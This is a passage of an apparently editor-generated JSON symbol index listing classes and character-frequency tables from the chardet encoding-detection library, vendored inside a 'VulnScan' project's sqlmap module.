        "peekOfCode": "EUCKR_CHAR_TO_FREQ_ORDER = (\n  13, 130, 120,1396, 481,1719,1720, 328, 609, 212,1721, 707, 400, 299,1722,  87,\n1397,1723, 104, 536,1117,1203,1724,1267, 685,1268, 508,1725,1726,1727,1728,1398,\n1399,1729,1730,1731, 141, 621, 326,1057, 368,1732, 267, 488,  20,1733,1269,1734,\n 945,1400,1735,  47, 904,1270,1736,1737, 773, 248,1738, 409, 313, 786, 429,1739,\n 116, 987, 813,1401, 683,  75,1204, 145,1740,1741,1742,1743,  16, 847, 667, 622,\n 708,1744,1745,1746, 966, 787, 304, 129,1747,  60, 820, 123, 676,1748,1749,1750,\n1751, 617,1752, 626,1753,1754,1755,1756, 653,1757,1758,1759,1760,1761,1762, 856,\n 344,1763,1764,1765,1766,  89, 401, 418, 806, 905, 848,1767,1768,1769, 946,1205,\n 709,1770,1118,1771, 241,1772,1773,1774,1271,1775, 569,1776, 999,1777,1778,1779,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.euckrfreq",
        "documentation": {}
    },
    {
        "label": "EUCKRProber",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.euckrprober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.euckrprober",
        "peekOfCode": "class EUCKRProber(MultiByteCharSetProber):\n    def __init__(self):\n        super(EUCKRProber, self).__init__()\n        self.coding_sm = CodingStateMachine(EUCKR_SM_MODEL)\n        self.distribution_analyzer = EUCKRDistributionAnalysis()\n        self.reset()\n    @property\n    def charset_name(self):\n        return \"EUC-KR\"\n    @property",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.euckrprober",
        "documentation": {}
    },
    {
        "label": "EUCTW_TYPICAL_DISTRIBUTION_RATIO",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.euctwfreq",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.euctwfreq",
        "peekOfCode": "EUCTW_TYPICAL_DISTRIBUTION_RATIO = 0.75\n# Char to FreqOrder table ,\nEUCTW_TABLE_SIZE = 5376\nEUCTW_CHAR_TO_FREQ_ORDER = (\n   1,1800,1506, 255,1431, 198,   9,  82,   6,7310, 177, 202,3615,1256,2808, 110,  # 2742\n3735,  33,3241, 261,  76,  44,2113,  16,2931,2184,1176, 659,3868,  26,3404,2643,  # 2758\n1198,3869,3313,4060, 410,2211, 302, 590, 361,1963,   8, 204,  58,4296,7311,1931,  # 2774\n  63,7312,7313, 317,1614,  75, 222, 159,4061,2412,1480,7314,3500,3068, 224,2809,  # 2790\n3616,   3,  10,3870,1471,  29,2774,1135,2852,1939, 873, 130,3242,1123, 312,7315,  # 2806\n4297,2051, 507, 252, 682,7316, 142,1914, 124, 206,2932,  34,3501,3173,  64, 604,  # 2822",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.euctwfreq",
        "documentation": {}
    },
    {
        "label": "EUCTW_TABLE_SIZE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.euctwfreq",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.euctwfreq",
        "peekOfCode": "EUCTW_TABLE_SIZE = 5376\nEUCTW_CHAR_TO_FREQ_ORDER = (\n   1,1800,1506, 255,1431, 198,   9,  82,   6,7310, 177, 202,3615,1256,2808, 110,  # 2742\n3735,  33,3241, 261,  76,  44,2113,  16,2931,2184,1176, 659,3868,  26,3404,2643,  # 2758\n1198,3869,3313,4060, 410,2211, 302, 590, 361,1963,   8, 204,  58,4296,7311,1931,  # 2774\n  63,7312,7313, 317,1614,  75, 222, 159,4061,2412,1480,7314,3500,3068, 224,2809,  # 2790\n3616,   3,  10,3870,1471,  29,2774,1135,2852,1939, 873, 130,3242,1123, 312,7315,  # 2806\n4297,2051, 507, 252, 682,7316, 142,1914, 124, 206,2932,  34,3501,3173,  64, 604,  # 2822\n7317,2494,1976,1977, 155,1990, 645, 641,1606,7318,3405, 337,  72, 406,7319,  80,  # 2838\n 630, 238,3174,1509, 263, 939,1092,2644, 756,1440,1094,3406, 449,  69,2969, 591,  # 2854",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.euctwfreq",
        "documentation": {}
    },
    {
        "label": "EUCTW_CHAR_TO_FREQ_ORDER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.euctwfreq",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.euctwfreq",
        "peekOfCode": "EUCTW_CHAR_TO_FREQ_ORDER = (\n   1,1800,1506, 255,1431, 198,   9,  82,   6,7310, 177, 202,3615,1256,2808, 110,  # 2742\n3735,  33,3241, 261,  76,  44,2113,  16,2931,2184,1176, 659,3868,  26,3404,2643,  # 2758\n1198,3869,3313,4060, 410,2211, 302, 590, 361,1963,   8, 204,  58,4296,7311,1931,  # 2774\n  63,7312,7313, 317,1614,  75, 222, 159,4061,2412,1480,7314,3500,3068, 224,2809,  # 2790\n3616,   3,  10,3870,1471,  29,2774,1135,2852,1939, 873, 130,3242,1123, 312,7315,  # 2806\n4297,2051, 507, 252, 682,7316, 142,1914, 124, 206,2932,  34,3501,3173,  64, 604,  # 2822\n7317,2494,1976,1977, 155,1990, 645, 641,1606,7318,3405, 337,  72, 406,7319,  80,  # 2838\n 630, 238,3174,1509, 263, 939,1092,2644, 756,1440,1094,3406, 449,  69,2969, 591,  # 2854\n 179,2095, 471, 115,2034,1843,  60,  50,2970, 134, 806,1868, 734,2035,3407, 180,  # 2870",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.euctwfreq",
        "documentation": {}
    },
    {
        "label": "EUCTWProber",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.euctwprober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.euctwprober",
        "peekOfCode": "class EUCTWProber(MultiByteCharSetProber):\n    def __init__(self):\n        super(EUCTWProber, self).__init__()\n        self.coding_sm = CodingStateMachine(EUCTW_SM_MODEL)\n        self.distribution_analyzer = EUCTWDistributionAnalysis()\n        self.reset()\n    @property\n    def charset_name(self):\n        return \"EUC-TW\"\n    @property",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.euctwprober",
        "documentation": {}
    },
    {
        "label": "GB2312_TYPICAL_DISTRIBUTION_RATIO",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.gb2312freq",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.gb2312freq",
        "peekOfCode": "GB2312_TYPICAL_DISTRIBUTION_RATIO = 0.9\nGB2312_TABLE_SIZE = 3760\nGB2312_CHAR_TO_FREQ_ORDER = (\n1671, 749,1443,2364,3924,3807,2330,3921,1704,3463,2691,1511,1515, 572,3191,2205,\n2361, 224,2558, 479,1711, 963,3162, 440,4060,1905,2966,2947,3580,2647,3961,3842,\n2204, 869,4207, 970,2678,5626,2944,2956,1479,4048, 514,3595, 588,1346,2820,3409,\n 249,4088,1746,1873,2047,1774, 581,1813, 358,1174,3590,1014,1561,4844,2245, 670,\n1636,3112, 889,1286, 953, 556,2327,3060,1290,3141, 613, 185,3477,1367, 850,3820,\n1715,2428,2642,2303,2732,3041,2562,2648,3566,3946,1349, 388,3098,2091,1360,3585,\n 152,1687,1539, 738,1559,  59,1232,2925,2267,1388,1249,1741,1679,2960, 151,1566,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.gb2312freq",
        "documentation": {}
    },
    {
        "label": "GB2312_TABLE_SIZE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.gb2312freq",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.gb2312freq",
        "peekOfCode": "GB2312_TABLE_SIZE = 3760\nGB2312_CHAR_TO_FREQ_ORDER = (\n1671, 749,1443,2364,3924,3807,2330,3921,1704,3463,2691,1511,1515, 572,3191,2205,\n2361, 224,2558, 479,1711, 963,3162, 440,4060,1905,2966,2947,3580,2647,3961,3842,\n2204, 869,4207, 970,2678,5626,2944,2956,1479,4048, 514,3595, 588,1346,2820,3409,\n 249,4088,1746,1873,2047,1774, 581,1813, 358,1174,3590,1014,1561,4844,2245, 670,\n1636,3112, 889,1286, 953, 556,2327,3060,1290,3141, 613, 185,3477,1367, 850,3820,\n1715,2428,2642,2303,2732,3041,2562,2648,3566,3946,1349, 388,3098,2091,1360,3585,\n 152,1687,1539, 738,1559,  59,1232,2925,2267,1388,1249,1741,1679,2960, 151,1566,\n1125,1352,4271, 924,4296, 385,3166,4459, 310,1245,2850,  70,3285,2729,3534,3575,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.gb2312freq",
        "documentation": {}
    },
    {
        "label": "GB2312_CHAR_TO_FREQ_ORDER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.gb2312freq",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.gb2312freq",
        "peekOfCode": "GB2312_CHAR_TO_FREQ_ORDER = (\n1671, 749,1443,2364,3924,3807,2330,3921,1704,3463,2691,1511,1515, 572,3191,2205,\n2361, 224,2558, 479,1711, 963,3162, 440,4060,1905,2966,2947,3580,2647,3961,3842,\n2204, 869,4207, 970,2678,5626,2944,2956,1479,4048, 514,3595, 588,1346,2820,3409,\n 249,4088,1746,1873,2047,1774, 581,1813, 358,1174,3590,1014,1561,4844,2245, 670,\n1636,3112, 889,1286, 953, 556,2327,3060,1290,3141, 613, 185,3477,1367, 850,3820,\n1715,2428,2642,2303,2732,3041,2562,2648,3566,3946,1349, 388,3098,2091,1360,3585,\n 152,1687,1539, 738,1559,  59,1232,2925,2267,1388,1249,1741,1679,2960, 151,1566,\n1125,1352,4271, 924,4296, 385,3166,4459, 310,1245,2850,  70,3285,2729,3534,3575,\n2398,3298,3466,1960,2265, 217,3647, 864,1909,2084,4401,2773,1010,3269,5152, 853,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.gb2312freq",
        "documentation": {}
    },
    {
        "label": "GB2312Prober",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.gb2312prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.gb2312prober",
        "peekOfCode": "class GB2312Prober(MultiByteCharSetProber):\n    def __init__(self):\n        super(GB2312Prober, self).__init__()\n        self.coding_sm = CodingStateMachine(GB2312_SM_MODEL)\n        self.distribution_analyzer = GB2312DistributionAnalysis()\n        self.reset()\n    @property\n    def charset_name(self):\n        return \"GB2312\"\n    @property",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.gb2312prober",
        "documentation": {}
    },
    {
        "label": "HebrewProber",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.hebrewprober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.hebrewprober",
        "peekOfCode": "class HebrewProber(CharSetProber):\n    # windows-1255 / ISO-8859-8 code points of interest\n    FINAL_KAF = 0xea\n    NORMAL_KAF = 0xeb\n    FINAL_MEM = 0xed\n    NORMAL_MEM = 0xee\n    FINAL_NUN = 0xef\n    NORMAL_NUN = 0xf0\n    FINAL_PE = 0xf3\n    NORMAL_PE = 0xf4",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.hebrewprober",
        "documentation": {}
    },
    {
        "label": "JIS_TYPICAL_DISTRIBUTION_RATIO",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.jisfreq",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.jisfreq",
        "peekOfCode": "JIS_TYPICAL_DISTRIBUTION_RATIO = 3.0\n# Char to FreqOrder table ,\nJIS_TABLE_SIZE = 4368\nJIS_CHAR_TO_FREQ_ORDER = (\n  40,   1,   6, 182, 152, 180, 295,2127, 285, 381,3295,4304,3068,4606,3165,3510, #   16\n3511,1822,2785,4607,1193,2226,5070,4608, 171,2996,1247,  18, 179,5071, 856,1661, #   32\n1262,5072, 619, 127,3431,3512,3230,1899,1700, 232, 228,1294,1298, 284, 283,2041, #   48\n2042,1061,1062,  48,  49,  44,  45, 433, 434,1040,1041, 996, 787,2997,1255,4305, #   64\n2108,4609,1684,1648,5073,5074,5075,5076,5077,5078,3687,5079,4610,5080,3927,3928, #   80\n5081,3296,3432, 290,2285,1471,2187,5082,2580,2825,1303,2140,1739,1445,2691,3375, #   96",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.jisfreq",
        "documentation": {}
    },
    {
        "label": "JIS_TABLE_SIZE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.jisfreq",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.jisfreq",
        "peekOfCode": "JIS_TABLE_SIZE = 4368\nJIS_CHAR_TO_FREQ_ORDER = (\n  40,   1,   6, 182, 152, 180, 295,2127, 285, 381,3295,4304,3068,4606,3165,3510, #   16\n3511,1822,2785,4607,1193,2226,5070,4608, 171,2996,1247,  18, 179,5071, 856,1661, #   32\n1262,5072, 619, 127,3431,3512,3230,1899,1700, 232, 228,1294,1298, 284, 283,2041, #   48\n2042,1061,1062,  48,  49,  44,  45, 433, 434,1040,1041, 996, 787,2997,1255,4305, #   64\n2108,4609,1684,1648,5073,5074,5075,5076,5077,5078,3687,5079,4610,5080,3927,3928, #   80\n5081,3296,3432, 290,2285,1471,2187,5082,2580,2825,1303,2140,1739,1445,2691,3375, #   96\n1691,3297,4306,4307,4611, 452,3376,1182,2713,3688,3069,4308,5083,5084,5085,5086, #  112\n5087,5088,5089,5090,5091,5092,5093,5094,5095,5096,5097,5098,5099,5100,5101,5102, #  128",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.jisfreq",
        "documentation": {}
    },
    {
        "label": "JIS_CHAR_TO_FREQ_ORDER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.jisfreq",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.jisfreq",
        "peekOfCode": "JIS_CHAR_TO_FREQ_ORDER = (\n  40,   1,   6, 182, 152, 180, 295,2127, 285, 381,3295,4304,3068,4606,3165,3510, #   16\n3511,1822,2785,4607,1193,2226,5070,4608, 171,2996,1247,  18, 179,5071, 856,1661, #   32\n1262,5072, 619, 127,3431,3512,3230,1899,1700, 232, 228,1294,1298, 284, 283,2041, #   48\n2042,1061,1062,  48,  49,  44,  45, 433, 434,1040,1041, 996, 787,2997,1255,4305, #   64\n2108,4609,1684,1648,5073,5074,5075,5076,5077,5078,3687,5079,4610,5080,3927,3928, #   80\n5081,3296,3432, 290,2285,1471,2187,5082,2580,2825,1303,2140,1739,1445,2691,3375, #   96\n1691,3297,4306,4307,4611, 452,3376,1182,2713,3688,3069,4308,5083,5084,5085,5086, #  112\n5087,5088,5089,5090,5091,5092,5093,5094,5095,5096,5097,5098,5099,5100,5101,5102, #  128\n5103,5104,5105,5106,5107,5108,5109,5110,5111,5112,4097,5113,5114,5115,5116,5117, #  144",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.jisfreq",
        "documentation": {}
    },
    {
        "label": "JapaneseContextAnalysis",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.jpcntx",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.jpcntx",
        "peekOfCode": "class JapaneseContextAnalysis(object):\n    NUM_OF_CATEGORY = 6\n    DONT_KNOW = -1\n    ENOUGH_REL_THRESHOLD = 100\n    MAX_REL_THRESHOLD = 1000\n    MINIMUM_DATA_THRESHOLD = 4\n    def __init__(self):\n        self._total_rel = None\n        self._rel_sample = None\n        self._need_to_skip_char_num = None",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.jpcntx",
        "documentation": {}
    },
    {
        "label": "SJISContextAnalysis",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.jpcntx",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.jpcntx",
        "peekOfCode": "class SJISContextAnalysis(JapaneseContextAnalysis):\n    def __init__(self):\n        super(SJISContextAnalysis, self).__init__()\n        self._charset_name = \"SHIFT_JIS\"\n    @property\n    def charset_name(self):\n        return self._charset_name\n    def get_order(self, byte_str):\n        if not byte_str:\n            return -1, 1",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.jpcntx",
        "documentation": {}
    },
    {
        "label": "EUCJPContextAnalysis",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.jpcntx",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.jpcntx",
        "peekOfCode": "class EUCJPContextAnalysis(JapaneseContextAnalysis):\n    def get_order(self, byte_str):\n        if not byte_str:\n            return -1, 1\n        # find out current char's byte length\n        first_char = byte_str[0]\n        if (first_char == 0x8E) or (0xA1 <= first_char <= 0xFE):\n            char_len = 2\n        elif first_char == 0x8F:\n            char_len = 3",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.jpcntx",
        "documentation": {}
    },
    {
        "label": "jp2CharContext",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.jpcntx",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.jpcntx",
        "peekOfCode": "jp2CharContext = (\n(0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1),\n(2,4,0,4,0,3,0,4,0,3,4,4,4,2,4,3,3,4,3,2,3,3,4,2,3,3,3,2,4,1,4,3,3,1,5,4,3,4,3,4,3,5,3,0,3,5,4,2,0,3,1,0,3,3,0,3,3,0,1,1,0,4,3,0,3,3,0,4,0,2,0,3,5,5,5,5,4,0,4,1,0,3,4),\n(0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2),\n(0,4,0,5,0,5,0,4,0,4,5,4,4,3,5,3,5,1,5,3,4,3,4,4,3,4,3,3,4,3,5,4,4,3,5,5,3,5,5,5,3,5,5,3,4,5,5,3,1,3,2,0,3,4,0,4,2,0,4,2,1,5,3,2,3,5,0,4,0,2,0,5,4,4,5,4,5,0,4,0,0,4,4),\n(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),\n(0,3,0,4,0,3,0,3,0,4,5,4,3,3,3,3,4,3,5,4,4,3,5,4,4,3,4,3,4,4,4,4,5,3,4,4,3,4,5,5,4,5,5,1,4,5,4,3,0,3,3,1,3,3,0,4,4,0,3,3,1,5,3,3,3,5,0,4,0,3,0,4,4,3,4,3,3,0,4,1,1,3,4),\n(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),\n(0,4,0,3,0,3,0,4,0,3,4,4,3,2,2,1,2,1,3,1,3,3,3,3,3,4,3,1,3,3,5,3,3,0,4,3,0,5,4,3,3,5,4,4,3,4,4,5,0,1,2,0,1,2,0,2,2,0,1,0,0,5,2,2,1,4,0,3,0,1,0,4,4,3,5,4,3,0,2,1,0,4,3),\n(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.jpcntx",
        "documentation": {}
    },
    {
        "label": "Latin5_BulgarianCharToOrderMap",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langbulgarianmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langbulgarianmodel",
        "peekOfCode": "Latin5_BulgarianCharToOrderMap = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253, 77, 90, 99,100, 72,109,107,101, 79,185, 81,102, 76, 94, 82,  # 40\n110,186,108, 91, 74,119, 84, 96,111,187,115,253,253,253,253,253,  # 50\n253, 65, 69, 70, 66, 63, 68,112,103, 92,194,104, 95, 86, 87, 71,  # 60\n116,195, 85, 93, 97,113,196,197,198,199,200,253,253,253,253,253,  # 70\n194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,  # 80",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langbulgarianmodel",
        "documentation": {}
    },
    {
        "label": "win1251BulgarianCharToOrderMap",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langbulgarianmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langbulgarianmodel",
        "peekOfCode": "win1251BulgarianCharToOrderMap = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253, 77, 90, 99,100, 72,109,107,101, 79,185, 81,102, 76, 94, 82,  # 40\n110,186,108, 91, 74,119, 84, 96,111,187,115,253,253,253,253,253,  # 50\n253, 65, 69, 70, 66, 63, 68,112,103, 92,194,104, 95, 86, 87, 71,  # 60\n116,195, 85, 93, 97,113,196,197,198,199,200,253,253,253,253,253,  # 70\n206,207,208,209,210,211,212,213,120,214,215,216,217,218,219,220,  # 80",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langbulgarianmodel",
        "documentation": {}
    },
    {
        "label": "BulgarianLangModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langbulgarianmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langbulgarianmodel",
        "peekOfCode": "BulgarianLangModel = (\n0,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,2,3,3,3,3,3,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,0,3,3,3,2,2,3,2,2,1,2,2,\n3,1,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,0,3,3,3,3,3,3,3,3,3,3,0,3,0,1,\n0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,2,3,3,3,3,3,3,3,3,0,3,1,0,\n0,1,0,0,0,0,0,0,0,0,1,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n3,2,2,2,3,3,3,3,3,3,3,3,3,3,3,3,3,1,3,2,3,3,3,3,3,3,3,3,0,3,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,2,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,1,3,2,3,3,3,3,3,3,3,3,0,3,0,0,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langbulgarianmodel",
        "documentation": {}
    },
    {
        "label": "Latin5BulgarianModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langbulgarianmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langbulgarianmodel",
        "peekOfCode": "Latin5BulgarianModel = {\n  'char_to_order_map': Latin5_BulgarianCharToOrderMap,\n  'precedence_matrix': BulgarianLangModel,\n  'typical_positive_ratio': 0.969392,\n  'keep_english_letter': False,\n  'charset_name': \"ISO-8859-5\",\n  'language': 'Bulgairan',\n}\nWin1251BulgarianModel = {\n  'char_to_order_map': win1251BulgarianCharToOrderMap,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langbulgarianmodel",
        "documentation": {}
    },
    {
        "label": "Win1251BulgarianModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langbulgarianmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langbulgarianmodel",
        "peekOfCode": "Win1251BulgarianModel = {\n  'char_to_order_map': win1251BulgarianCharToOrderMap,\n  'precedence_matrix': BulgarianLangModel,\n  'typical_positive_ratio': 0.969392,\n  'keep_english_letter': False,\n  'charset_name': \"windows-1251\",\n  'language': 'Bulgarian',\n}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langbulgarianmodel",
        "documentation": {}
    },
    {
        "label": "KOI8R_char_to_order_map",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "peekOfCode": "KOI8R_char_to_order_map = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,  # 40\n155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,  # 50\n253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,  # 60\n 67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,  # 70\n191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,  # 80",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "documentation": {}
    },
    {
        "label": "win1251_char_to_order_map",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "peekOfCode": "win1251_char_to_order_map = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,  # 40\n155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,  # 50\n253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,  # 60\n 67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,  # 70\n191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "documentation": {}
    },
    {
        "label": "latin5_char_to_order_map",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "peekOfCode": "latin5_char_to_order_map = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,  # 40\n155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,  # 50\n253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,  # 60\n 67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,  # 70\n191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "documentation": {}
    },
    {
        "label": "macCyrillic_char_to_order_map",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
